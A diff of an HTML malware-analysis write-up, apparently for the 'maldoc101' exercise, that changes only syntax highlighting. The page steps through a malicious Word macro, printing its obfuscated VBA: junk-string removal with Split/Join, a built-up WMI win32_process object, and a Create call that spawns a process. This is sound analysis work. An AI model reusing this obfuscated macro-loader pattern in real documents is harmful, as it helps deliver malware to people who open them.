@@ -212,8 +212,8 @@ Loop
 <p>So the next step is figuring out what <code>roubhaol.Zoom</code>'s value is. This value is not set anywhere in any of the macros by code. This means that the value is set in the form itself. To confirm, I opened up the Word document, pressed <code>Alt+F11</code> to open up the Visual Basic editor and then opened the <code>roubhaol</code> form. At the bottom we see that the value of <code>Zoom</code> is set to <code>100</code>.</p>
 <p><img alt="maldoc101-writeup-01" src="./images/maldoc101-writeup-01.png" /></p>
 <p>This means that by simulating the first line of code again we find that the variable <code>gooykadheoj</code> gets the character value of <code>s</code>.</p>
-<div class="codehilite"><pre><span></span><code>gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))
-gooykadheoj = Chr(100 + Int(5 * 3))
+<div class="codehilite"><pre><span></span><code>gooykadheoj = Chr(roubhaol.Zoom + Int(5 <span class="gs">* 3))</span>
+<span class="gs">gooykadheoj = Chr(100 + Int(5 *</span> 3))
 gooykadheoj = Chr(115)
 gooykadheoj = Chr(115) # character &quot;s&quot;
 </code></pre></div>
@@ -229,48 +229,48 @@ gooykadheoj = Chr(115) # character &quot;s&quot;
 <p>This one is easier to simulate. <code>c7�ATOQe2�j</code> is assigend 6. And then there's a loop that adds <code>5</code> that eventually results to the value of <code>16</code>.</p>
 <p>But wait, something is fishy here. The variable <code>c7�ATOQe2�j</code> is not found anywhere else after the block of code above. This tells us that this is just junk code that does not really do anything aside from waste an analyst's time! Sneaky sneaky.</p>
 <p>To save me the time I proceeded to remove all junk code. I did this by going through each variables and seeing if they are used somewhere useful. If not, then they are safe to remove.</p>
-<div class="codehilite"><pre><span></span><code><span class="nv">Attribute</span><span class="w"> </span><span class="nv">VB_Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;govwiahtoozfaid&quot;</span>
-<span class="nv">Function</span><span class="w"> </span><span class="nv">boaxvoebxiotqueb</span><span class="ss">()</span>
-<span class="w">    </span><span class="nv">gooykadheoj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">Chr</span><span class="ss">(</span><span class="nv">roubhaol</span>.<span class="nv">Zoom</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">Int</span><span class="ss">(</span><span class="mi">5</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">3</span><span class="ss">))</span>
+<div class="codehilite"><pre><span></span><code>Attribute VB_Name = &quot;govwiahtoozfaid&quot;
+Function boaxvoebxiotqueb()
+    gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))
 
-<span class="w">    </span><span class="nv">haothkoebtheil</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fq&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">gooykadheoj</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fq&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">roubhaol</span>.<span class="nv">joefwoefcheaw</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;</span>
+    haothkoebtheil = &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fq&quot; + gooykadheoj + &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fq&quot; + roubhaol.joefwoefcheaw + &quot;2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;
 
-<span class="w">    </span><span class="nv">deulsaocthuul</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">juuvzouchmiopxeox</span><span class="ss">(</span><span class="nv">haothkoebtheil</span><span class="ss">)</span>
+    deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
 
-<span class="w">    </span><span class="nv">Set</span><span class="w"> </span><span class="nv">tiajriokchaoy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">CreateObject</span><span class="ss">(</span><span class="nv">deulsaocthuul</span><span class="ss">)</span>
+    Set tiajriokchaoy = CreateObject(deulsaocthuul)
 
-<span class="w">    </span><span class="nv">deaknaugthein</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">roubhaol</span>.<span class="nv">kaizseah</span>.<span class="nv">ControlTipText</span>
-<span class="w">    </span><span class="nv">giakfeiw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">deulsaocthuul</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">gooykadheoj</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">roubhaol</span>.<span class="nv">paerwagyouqumeid</span>.<span class="nv">ControlTipText</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">deaknaugthein</span>
-<span class="w">    </span><span class="nv">queegthaen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">giakfeiw</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">roubhaol</span>.<span class="nv">joefwoefcheaw</span>
+    deaknaugthein = roubhaol.kaizseah.ControlTipText
+    giakfeiw = deulsaocthuul + gooykadheoj + roubhaol.paerwagyouqumeid.ControlTipText + deaknaugthein
+    queegthaen = giakfeiw + roubhaol.joefwoefcheaw
 
-<span class="w">    </span><span class="nv">Set</span><span class="w"> </span><span class="nv">deavjoajsear</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">luumlaud</span><span class="ss">(</span><span class="nv">queegthaen</span><span class="ss">)</span>
+    Set deavjoajsear = luumlaud(queegthaen)
 
-<span class="w">    </span><span class="nv">xve</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">Array</span><span class="w"> </span><span class="nv">_</span>
-<span class="w">        </span><span class="ss">(</span><span class="s2">&quot;1234444123&quot;</span>,<span class="w"> </span><span class="nv">tiajriokchaoy</span>.<span class="w"> </span><span class="nv">_</span>
-<span class="w">        </span><span class="nv">Create</span><span class="ss">(</span><span class="nv">geulgelquuuj</span>,<span class="w"> </span><span class="nv">kaenhaig</span>,<span class="w"> </span><span class="nv">deavjoajsear</span><span class="ss">)</span>,<span class="w"> </span><span class="s2">&quot;9938723&quot;</span><span class="ss">)</span>
-<span class="k">End</span><span class="w"> </span><span class="nv">Function</span>
+    xve = Array <span class="ge">_</span>
+<span class="ge">        (&quot;1234444123&quot;, tiajriokchaoy. _</span>
+        Create(geulgelquuuj, kaenhaig, deavjoajsear), &quot;9938723&quot;)
+End Function
 
-<span class="nv">Function</span><span class="w"> </span><span class="nv">juuvzouchmiopxeox</span><span class="ss">(</span><span class="nv">yiajthoavheiw</span><span class="ss">)</span>
-<span class="w">    </span><span class="nv">geutyoeytiestheug</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">yiajthoavheiw</span>
-<span class="w">    </span><span class="nv">feaxgeip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">Split</span><span class="ss">(</span><span class="nv">geutyoeytiestheug</span>,<span class="w"> </span><span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fq&quot;</span><span class="ss">)</span>
+Function juuvzouchmiopxeox(yiajthoavheiw)
+    geutyoeytiestheug = yiajthoavheiw
+    feaxgeip = Split(geutyoeytiestheug, &quot;2342772g3&amp;*gs7712ffvs626fq&quot;)
 
-<span class="w">    </span><span class="nv">jaquhoiqu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">csqw</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">Join</span><span class="ss">(</span><span class="nv">feaxgeip</span>,<span class="w"> </span><span class="nv">eihnx</span><span class="ss">)</span>
-<span class="w">    </span><span class="nv">juuvzouchmiopxeox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">jaquhoiqu</span>
-<span class="k">End</span><span class="w"> </span><span class="nv">Function</span>
+    jaquhoiqu = csqw + Join(feaxgeip, eihnx)
+    juuvzouchmiopxeox = jaquhoiqu
+End Function
 
-<span class="nv">Function</span><span class="w"> </span><span class="nv">geulgelquuuj</span><span class="ss">()</span>
-<span class="w">    </span><span class="nv">sjiqw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">roubhaol</span>.<span class="nv">gaoddaicsauktheb</span>.<span class="nv">Pages</span><span class="ss">(</span><span class="mi">10</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">10</span><span class="ss">)</span>.<span class="nv">ControlTipText</span>
-<span class="w">    </span><span class="nv">geulgelquuuj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">juuvzouchmiopxeox</span><span class="ss">(</span><span class="nv">sjiqw</span><span class="ss">)</span>
-<span class="k">End</span><span class="w"> </span><span class="nv">Function</span>
+Function geulgelquuuj()
+    sjiqw = roubhaol.gaoddaicsauktheb.Pages(10 / 10).ControlTipText
+    geulgelquuuj = juuvzouchmiopxeox(sjiqw)
+End Function
 
-<span class="nv">Function</span><span class="w"> </span><span class="nv">luumlaud</span><span class="ss">(</span><span class="nv">zeolkaepxoag</span><span class="ss">)</span>
-<span class="w">    </span><span class="nv">Set</span><span class="w"> </span><span class="nv">luumlaud</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">CreateObject</span><span class="ss">(</span><span class="nv">zeolkaepxoag</span><span class="ss">)</span>
-<span class="w">    </span><span class="nv">Dim</span><span class="w"> </span><span class="nv">vPu</span><span class="w"> </span><span class="nv">As</span><span class="w"> </span><span class="nv">String</span>
-<span class="w">    </span><span class="nv">vPu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">Replace</span>$<span class="ss">(</span><span class="s2">&quot;BenqV1�igVwifwdQq&quot;</span>,<span class="w"> </span><span class="s2">&quot;BenqV1�i&quot;</span>,<span class="w"> </span><span class="s2">&quot;on5�&quot;</span><span class="ss">)</span>
-<span class="w">        </span><span class="nv">luumlaud</span><span class="w"> </span><span class="nv">_</span>
-<span class="w">        </span>.<span class="w"> </span><span class="nv">_</span>
-<span class="w">        </span><span class="nv">showwindow</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">(</span><span class="nv">mujgoiy</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">jioyseertioch</span><span class="ss">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="ss">(</span><span class="nv">neivberziok</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">xuajroegquoudcaij</span><span class="ss">)</span>
-<span class="k">End</span><span class="w"> </span><span class="nv">Function</span>
+Function luumlaud(zeolkaepxoag)
+    Set luumlaud = CreateObject(zeolkaepxoag)
+    Dim vPu As String
+    vPu = Replace$(&quot;BenqV1�igVwifwdQq&quot;, &quot;BenqV1�i&quot;, &quot;on5�&quot;)
+        luumlaud <span class="ge">_</span>
+<span class="ge">        . _</span>
+        showwindow = (mujgoiy + jioyseertioch) + (neivberziok + xuajroegquoudcaij)
+End Function
 </code></pre></div>
 
 <p>As you can see above, the code is shorter. It's also a little easier to understand. Only a little though, we still need to step through the code carefully to have a better grasp of what it is doing.</p>
@@ -290,13 +290,13 @@ gooykadheoj = Chr(115) # character &quot;s&quot;
 </code></pre></div>
 
 <p>Let's look at the code inside <code>juuvzouchmiopxeox</code>.</p>
-<div class="codehilite"><pre><span></span><code><span class="nv">Function</span><span class="w"> </span><span class="nv">juuvzouchmiopxeox</span><span class="ss">(</span><span class="nv">yiajthoavheiw</span><span class="ss">)</span>
-<span class="w">    </span><span class="nv">geutyoeytiestheug</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">yiajthoavheiw</span>
-<span class="w">    </span><span class="nv">feaxgeip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">Split</span><span class="ss">(</span><span class="nv">geutyoeytiestheug</span>,<span class="w"> </span><span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fq&quot;</span><span class="ss">)</span>
+<div class="codehilite"><pre><span></span><code>Function juuvzouchmiopxeox(yiajthoavheiw)
+    geutyoeytiestheug = yiajthoavheiw
+    feaxgeip = Split(geutyoeytiestheug, &quot;2342772g3&amp;*gs7712ffvs626fq&quot;)
 
-<span class="w">    </span><span class="nv">jaquhoiqu</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">csqw</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">Join</span><span class="ss">(</span><span class="nv">feaxgeip</span>,<span class="w"> </span><span class="nv">eihnx</span><span class="ss">)</span>
-<span class="w">    </span><span class="nv">juuvzouchmiopxeox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">jaquhoiqu</span>
-<span class="k">End</span><span class="w"> </span><span class="nv">Function</span>
+    jaquhoiqu = csqw + Join(feaxgeip, eihnx)
+    juuvzouchmiopxeox = jaquhoiqu
+End Function
 </code></pre></div>
 
 <p>Following the code we could see that the passed string is splitted using the call to the function <code>Split</code> with the substring <code>2342772g3&amp;*gs7712ffvs626fq</code>. This simply means that the substring is removed from the input string. The result of <code>Split</code> is then joined into one string using <code>Join</code>. There are the variables <code>csqw</code> and <code>eihnx</code>, they don't alter the string as these variables are empty. </p>
